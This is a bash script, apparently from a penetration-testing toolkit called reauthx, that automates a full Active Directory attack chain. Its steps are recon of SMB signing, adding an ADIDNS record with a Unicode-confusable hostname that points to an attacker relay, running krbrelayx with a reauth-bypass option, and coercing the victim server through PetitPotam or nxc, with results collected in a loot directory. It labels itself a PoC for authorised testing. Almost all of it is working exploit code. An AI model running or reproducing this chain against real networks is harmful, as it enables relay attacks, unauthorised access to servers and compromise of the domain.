#!/usr/bin/env bash
#
# reauthx.sh - one orchestrator for the whole reauthx workflow.
#
# Wraps the five README steps behind a single CLI. Set the engagement parameters
# once (flags or REAUTHX_* env); every sub-command then uses only the subset of
# them it actually needs:
#
#   check      preflight: python deps, shipped scripts, external tools, root
#   name       print the coercion record (what gets registered / coerced to)
#   recon      signing + patch-window recon          (patchcheck.py [+ nxc])
#   dns-add    register the ADIDNS record -> relay    (dnstool.py | bloodyAD)
#   dns-del    remove the ADIDNS record               (dnstool.py | bloodyAD)
#   relay      start the reauthx relay (--reauth-bypass, needs sudo)
#   coerce     coerce the target onto the relay       (nxc coerce_plus | PetitPotam)
#   auto       dns-add -> relay(bg) -> coerce -> loot -> dns-del, with a cleanup trap
#
# Example (README host FS01 10.0.0.10, DC 10.0.0.5, relay 10.0.0.50):
#
#   ./reauthx.sh auto \
#       -T 10.0.0.10 -H fs01.ad.local -d ad.local \
#       --dc-host dc01.ad.local --dc-ip 10.0.0.5 -R 10.0.0.50 \
#       -u user1 -p Passw0rd1
#
#   # or drive a single step, e.g. just recon:
#   ./reauthx.sh recon -T 10.0.0.10 -d ad.local -u user1 -p Passw0rd1 \
#       --probe-user user2 --probe-pass Passw0rd2
#
# Pass -n/--dry-run on any command to print what would run (secrets masked) and
# execute nothing. This is a PoC for AUTHORISED testing only.
#
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PY="${PYTHON:-python3}"
# the unicode record (U+2024 dots, confusable letters) must survive stdout capture
# on any console codepage; force UTF-8 for every python child we spawn.
export PYTHONIOENCODING=utf-8 PYTHONUTF8=1

# ---------------------------------------------------------------- parameters ---
TARGET_IP=""          # victim / relay target (FS01)
TARGET_HOST=""        # victim FQDN (needed to build the unicode name)
DOMAIN=""             # AD domain, e.g. ad.local
DC_HOST=""            # DC hostname (holds the DNS zone)
DC_IP=""              # DC IP (LDAP + DNS)
RELAY_IP=""           # your relay's IP (the ADIDNS record points here)

USER1=""              # low-priv account used throughout
PASS1="${REAUTHX_PASS:-}"
PROBE_USER=""         # second account, recon cross-user swap only
PROBE_PASS="${REAUTHX_PROBE_PASS:-}"

NAME_MODE="unicode"   # unicode (CVE-2026-26128) is REQUIRED for reauthx (Kerberos)
VARIANT="circled"
LETTER=""
DNS_TOOL="dnstool"    # dnstool (shipped) | bloodyad
COERCE_TOOL="nxc"     # nxc (coerce_plus) | petitpotam
LOOT_DIR="$HERE/loot"

DRY_RUN=0
ASSUME_YES=0
NO_NXC=0

# ------------------------------------------------------------------- helpers ---
c_red=$'\033[31m'; c_grn=$'\033[32m'; c_yel=$'\033[33m'; c_cyn=$'\033[36m'; c_rst=$'\033[0m'
[ -t 2 ] || { c_red=""; c_grn=""; c_yel=""; c_cyn=""; c_rst=""; }

log()  { printf '%s[*]%s %s\n' "$c_cyn" "$c_rst" "$*" >&2; }
ok()   { printf '%s[+]%s %s\n' "$c_grn" "$c_rst" "$*" >&2; }
warn() { printf '%s[!]%s %s\n' "$c_yel" "$c_rst" "$*" >&2; }
die()  { printf '%s[-]%s %s\n' "$c_red" "$c_rst" "$*" >&2; exit 1; }

have() { command -v "$1" >/dev/null 2>&1; }

# require that named variables are set for this sub-command
need() {
  local miss=() v
  for v in "$@"; do
    [ -n "${!v:-}" ] || miss+=("$v")
  done
  [ ${#miss[@]} -eq 0 ] || die "missing required option(s) for '$CMD': ${miss[*]}  (see: $0 help)"
}

# secrets to blank out in printed commands
SECRETS=()
add_secret() { [ -n "${1:-}" ] && SECRETS+=("$1"); }

# print a command with any secret argument masked, then run it (unless --dry-run)
run() {
  local shown=() a s masked
  for a in "$@"; do
    masked="$a"
    for s in "${SECRETS[@]:-}"; do
      [ -n "$s" ] && [ "$a" = "$s" ] && masked="********"
      # also mask secrets embedded in a larger arg (e.g. DOM/user:pass@host)
      [ -n "$s" ] && case "$a" in *"$s"*) masked="${masked//$s/********}";; esac
    done
    case "$masked" in *[![:alnum:]_./:@-]*) shown+=("'$masked'");; *) shown+=("$masked");; esac
  done
  printf '%s$%s %s\n' "$c_grn" "$c_rst" "${shown[*]}" >&2
  [ "$DRY_RUN" -eq 1 ] && return 0
  "$@"
}

confirm() {
  [ "$ASSUME_YES" -eq 1 ] || [ "$DRY_RUN" -eq 1 ] && return 0
  local reply
  printf '%s[?]%s %s [y/N] ' "$c_yel" "$c_rst" "$1" >&2
  read -r reply || true
  case "$reply" in [yY]|[yY][eE][sS]) return 0;; *) die "aborted by user";; esac
}

# resolve the DC endpoint for LDAP (prefer FQDN so Kerberos/SPNs line up)
dc_endpoint() { [ -n "$DC_HOST" ] && printf '%s' "$DC_HOST" || printf '%s' "$DC_IP"; }

# ------------------------------------------------------- the coercion record ---
RECORD=""
compute_record() {
  [ -n "$RECORD" ] && return 0
  if [ "$NAME_MODE" = "unicode" ]; then
    need TARGET_HOST
    RECORD="$("$PY" "$HERE/coerce_name.py" "$TARGET_HOST" --mode unicode \
               --variant "$VARIANT" ${LETTER:+--letter "$LETTER"} --raw)"
  else
    warn "cmti name forces a LOCAL/NTLM auth; reauthx is Kerberos-only and will reject it."
    warn "cmti is for an NTLM relay (ntlmrelayx). For reauthx use --name unicode."
    RECORD="$("$PY" "$HERE/coerce_name.py" --mode cmti --raw)"
  fi
  [ -n "$RECORD" ] || die "failed to generate coercion record"
}

# --------------------------------------------------------------- sub-commands ---
cmd_check() {
  local rc=0
  log "python:    $("$PY" --version 2>&1 || echo 'NOT FOUND')"
  for s in coerce_name.py patchcheck.py dnstool.py krbrelayx.py printerbug.py; do
    [ -f "$HERE/$s" ] && ok "shipped:   $s" || { warn "missing shipped script: $s"; rc=1; }
  done
  "$PY" -c 'import impacket' 2>/dev/null && ok "python:    impacket importable" \
    || { warn "python dep 'impacket' not importable (pip install -r requirements.txt)"; rc=1; }
  # external tools, only those the chosen methods need
  [ "$DNS_TOOL" = "bloodyad" ]     && { have bloodyAD && ok "external:  bloodyAD" || warn "bloodyAD not on PATH"; }
  [ "$COERCE_TOOL" = "nxc" ]       && { have nxc && ok "external:  nxc" || warn "nxc not on PATH (needed for coerce + recon module)"; }
  [ "$COERCE_TOOL" = "petitpotam" ] && { [ -f "$HERE/PetitPotam.py" ] || have PetitPotam.py; } \
      && ok "external:  PetitPotam.py" || { [ "$COERCE_TOOL" = "petitpotam" ] && warn "PetitPotam.py not found"; }
  have dig && ok "external:  dig (DNS verify)" || warn "dig not on PATH (DNS verify will be skipped)"
  [ "$(id -u 2>/dev/null || echo 1)" = "0" ] && ok "running as root (relay can bind)" \
    || warn "not root; the 'relay' step needs sudo"
  return $rc
}

cmd_name() {
  compute_record
  printf '%s\n' "$RECORD"
  log "mode=$NAME_MODE  (register with dns-add, coerce to this exact string)"
}

cmd_recon() {
  need TARGET_IP DOMAIN USER1 PASS1
  add_secret "$PASS1"; add_secret "$PROBE_PASS"
  log "recon: is SMB signing enforced, and where in the patch window?"
  run "$PY" "$HERE/patchcheck.py" "${DOMAIN}/${USER1}:${PASS1}@${TARGET_IP}" \
      ${PROBE_USER:+--probe "${PROBE_USER}:${PROBE_PASS}"}
  if [ "$NO_NXC" -eq 0 ] && have nxc; then
    log "recon: nxc reauth_swap (cross-user signing-key swap probe)"
    run nxc smb "$TARGET_IP" -u "$USER1" -p "$PASS1" -d "$DOMAIN" -M reauth_swap \
        ${PROBE_USER:+-o "PROBE_USER=$PROBE_USER" "PROBE_PASS=$PROBE_PASS"}
  else
    [ "$NO_NXC" -eq 0 ] && warn "nxc not on PATH; skipped the reauth_swap module (patchcheck covers signing)."
  fi
}

cmd_dns_add() {
  need USER1 RELAY_IP; compute_record
  [ -n "$DC_HOST$DC_IP" ] || die "dns-add needs --dc-host and/or --dc-ip"
  add_secret "$PASS1"
  confirm "register ADIDNS record '$RECORD' -> $RELAY_IP on $(dc_endpoint)?"
  if [ "$DNS_TOOL" = "dnstool" ]; then
    need DOMAIN
    run "$PY" "$HERE/dnstool.py" "$(dc_endpoint)" -u "${DOMAIN}\\${USER1}" \
        ${PASS1:+-p "$PASS1"} -r "$RECORD" -d "$RELAY_IP" -a add --tcp \
        ${DC_IP:+-dc-ip "$DC_IP"}
  else
    need DOMAIN DC_HOST
    run bloodyAD -u "$USER1" -p "$PASS1" -d "$DOMAIN" --host "$DC_HOST" \
        add dnsRecord "$RECORD" "$RELAY_IP"
  fi
  dns_verify
}

cmd_dns_del() {
  need USER1; compute_record
  [ -n "$DC_HOST$DC_IP" ] || die "dns-del needs --dc-host and/or --dc-ip"
  add_secret "$PASS1"
  if [ "$DNS_TOOL" = "dnstool" ]; then
    need DOMAIN
    run "$PY" "$HERE/dnstool.py" "$(dc_endpoint)" -u "${DOMAIN}\\${USER1}" \
        ${PASS1:+-p "$PASS1"} -r "$RECORD" -a ldapdelete --tcp ${DC_IP:+-dc-ip "$DC_IP"}
  else
    need DOMAIN DC_HOST
    run bloodyAD -u "$USER1" -p "$PASS1" -d "$DOMAIN" --host "$DC_HOST" \
        remove dnsRecord "$RECORD" "$RELAY_IP"
  fi
}

dns_verify() {
  have dig || { warn "dig not found; skipping DNS verification"; return 0; }
  [ "$DRY_RUN" -eq 1 ] && return 0
  local server="${DC_IP:-$DC_HOST}" i got
  log "verifying the record resolves to $RELAY_IP via $server ..."
  for i in $(seq 1 10); do
    got="$(dig +noidnin +noidnout +short "$RECORD" @"$server" 2>/dev/null | head -n1 || true)"
    [ "$got" = "$RELAY_IP" ] && { ok "DNS: $RECORD -> $got"; return 0; }
    sleep 2
  done
  warn "DNS did not confirm $RELAY_IP yet (ADIDNS can lag ~a few min); continuing."
}

cmd_relay() {
  need TARGET_IP USER1 PASS1
  add_secret "$PASS1"
  [ "$(id -u 2>/dev/null || echo 1)" = "0" ] || warn "relay needs root to bind; prefix with sudo if this fails."
  mkdir -p "$LOOT_DIR"
  log "starting reauthx relay -> smb://$TARGET_IP  (base session: $DOMAIN/$USER1)  loot: $LOOT_DIR"
  run "$PY" "$HERE/krbrelayx.py" -t "smb://$TARGET_IP" \
      --reauth-bypass "${DOMAIN}/${USER1}:${PASS1}" \
      ${RELAY_IP:+-ip "$RELAY_IP"} -l "$LOOT_DIR"
}

cmd_coerce() {
  need TARGET_IP DOMAIN USER1 PASS1; compute_record
  add_secret "$PASS1"
  confirm "coerce $TARGET_IP to authenticate to '$RECORD' (-> your relay)?"
  if [ "$COERCE_TOOL" = "nxc" ]; then
    [ "$DRY_RUN" -eq 1 ] || have nxc || die "nxc not on PATH (needed for coerce_plus); or use --coerce-tool petitpotam"
    run nxc smb "$TARGET_IP" -u "$USER1" -p "$PASS1" -d "$DOMAIN" \
        -M coerce_plus -o M=petitpotam "LISTENER=$RECORD"
  else
    local pp="$HERE/PetitPotam.py"; [ -f "$pp" ] || pp="PetitPotam.py"
    run "$PY" "$pp" -d "$DOMAIN" -u "$USER1" -p "$PASS1" "$RECORD" "$TARGET_IP"
  fi
}

# full chain with guaranteed teardown of the DNS record + relay
cmd_auto() {
  need TARGET_IP DOMAIN USER1 PASS1 RELAY_IP
  [ -n "$DC_HOST$DC_IP" ] || die "auto needs --dc-host and/or --dc-ip"
  compute_record
  mkdir -p "$LOOT_DIR"

  RELAY_PID=""
  cleanup() {
    local ec=$?
    warn "teardown ..."
    if [ -n "${RELAY_PID:-}" ] && kill -0 "$RELAY_PID" 2>/dev/null; then
      log "stopping relay (pid $RELAY_PID)"; kill "$RELAY_PID" 2>/dev/null || sudo kill "$RELAY_PID" 2>/dev/null || true
    fi
    ASSUME_YES=1 cmd_dns_del || warn "DNS record NOT removed - delete '$RECORD' by hand!"
    exit $ec
  }
  trap cleanup EXIT INT TERM

  cmd_dns_add

  log "launching relay in the background ..."
  local sudo=""; [ "$(id -u 2>/dev/null || echo 1)" = "0" ] || sudo="sudo"
  if [ "$DRY_RUN" -eq 1 ]; then
    run $sudo "$PY" "$HERE/krbrelayx.py" -t "smb://$TARGET_IP" \
        --reauth-bypass "${DOMAIN}/${USER1}:${PASS1}" -ip "$RELAY_IP" -l "$LOOT_DIR"
  else
    $sudo "$PY" "$HERE/krbrelayx.py" -t "smb://$TARGET_IP" \
        --reauth-bypass "${DOMAIN}/${USER1}:${PASS1}" -ip "$RELAY_IP" -l "$LOOT_DIR" \
        >"$LOOT_DIR/relay.log" 2>&1 &
    RELAY_PID=$!
    log "relay pid $RELAY_PID (log: $LOOT_DIR/relay.log); waiting for it to come up ..."
    local i; for i in $(seq 1 10); do
      kill -0 "$RELAY_PID" 2>/dev/null || die "relay exited early - see $LOOT_DIR/relay.log"
      grep -qiE 'server.*start|listening|setting up' "$LOOT_DIR/relay.log" 2>/dev/null && break
      sleep 1
    done
  fi

  cmd_coerce

  if [ "$DRY_RUN" -eq 0 ]; then
    log "coercion fired; waiting up to 60s for loot to land in $LOOT_DIR ..."
    local before after i; before="$(ls -1 "$LOOT_DIR" 2>/dev/null | grep -v relay.log | wc -l)"
    for i in $(seq 1 60); do
      after="$(ls -1 "$LOOT_DIR" 2>/dev/null | grep -v relay.log | wc -l)"
      [ "$after" -gt "$before" ] && { ok "new loot in $LOOT_DIR:"; ls -1t "$LOOT_DIR" | grep -v relay.log | head >&2; break; }
      sleep 1
    done
  fi
  ok "done; teardown trap will remove the DNS record and stop the relay."
}

# ----------------------------------------------------------------- arg parse ---
usage() {
  sed -n '2,40p' "${BASH_SOURCE[0]}" | sed 's/^#\?//'
  cat >&2 <<'EOF'

Options (each command uses only the ones it needs):
  target/topology
    -T, --target-ip IP        victim / relay target (FS01)
    -H, --target-host FQDN    victim FQDN  (required to build a --name unicode record)
    -d, --domain DOMAIN       AD domain (e.g. ad.local)
        --dc-host FQDN        DC hostname (holds the ADIDNS zone)
        --dc-ip IP            DC IP (LDAP + DNS)
    -R, --relay-ip IP         your relay IP (the record points here)
  credentials
    -u, --user USER           low-priv account (recon/dns/relay/coerce/cleanup)
    -p, --pass PASS           password  (or env REAUTHX_PASS; dnstool prompts if omitted)
        --probe-user USER     second account (recon cross-user swap only)
        --probe-pass PASS     (or env REAUTHX_PROBE_PASS)
  name / method
        --name unicode|cmti   coercion name family (default unicode; required for reauthx)
        --variant V           unicode confusable: circled|precomposed|combining
        --letter L            unicode: which hostname letter to substitute
        --dns-tool T          dnstool (shipped, default) | bloodyad
        --coerce-tool T       nxc (coerce_plus, default) | petitpotam
        --loot DIR            relay loot dir (default ./loot)
  behaviour
    -n, --dry-run             print commands (secrets masked), run nothing
    -y, --yes                 don't prompt before outbound/destructive steps
        --no-nxc              recon: patchcheck only, skip the nxc module
    -h, --help
EOF
}

CMD="${1:-help}"; shift || true
case "$CMD" in -h|--help|help|"") usage; exit 0;; esac

while [ $# -gt 0 ]; do
  case "$1" in
    -T|--target-ip)   TARGET_IP="$2"; shift 2;;
    -H|--target-host) TARGET_HOST="$2"; shift 2;;
    -d|--domain)      DOMAIN="$2"; shift 2;;
    --dc-host)        DC_HOST="$2"; shift 2;;
    --dc-ip)          DC_IP="$2"; shift 2;;
    -R|--relay-ip)    RELAY_IP="$2"; shift 2;;
    -u|--user)        USER1="$2"; shift 2;;
    -p|--pass)        PASS1="$2"; shift 2;;
    --probe-user)     PROBE_USER="$2"; shift 2;;
    --probe-pass)     PROBE_PASS="$2"; shift 2;;
    --name)           NAME_MODE="$2"; shift 2;;
    --variant)        VARIANT="$2"; shift 2;;
    --letter)         LETTER="$2"; shift 2;;
    --dns-tool)       DNS_TOOL="$2"; shift 2;;
    --coerce-tool)    COERCE_TOOL="$2"; shift 2;;
    --loot)           LOOT_DIR="$2"; shift 2;;
    -n|--dry-run)     DRY_RUN=1; shift;;
    -y|--yes)         ASSUME_YES=1; shift;;
    --no-nxc)         NO_NXC=1; shift;;
    -h|--help)        usage; exit 0;;
    *) die "unknown option: $1  (see: $0 help)";;
  esac
done

case "$NAME_MODE"  in unicode|cmti) ;; *) die "--name must be unicode|cmti";; esac
case "$DNS_TOOL"   in dnstool|bloodyad) ;; *) die "--dns-tool must be dnstool|bloodyad";; esac
case "$COERCE_TOOL" in nxc|petitpotam) ;; *) die "--coerce-tool must be nxc|petitpotam";; esac

case "$CMD" in
  check)    cmd_check;;
  name)     cmd_name;;
  recon)    cmd_recon;;
  dns-add)  cmd_dns_add;;
  dns-del)  cmd_dns_del;;
  relay)    cmd_relay;;
  coerce)   cmd_coerce;;
  auto)     cmd_auto;;
  *) die "unknown command: $CMD  (see: $0 help)";;
esac
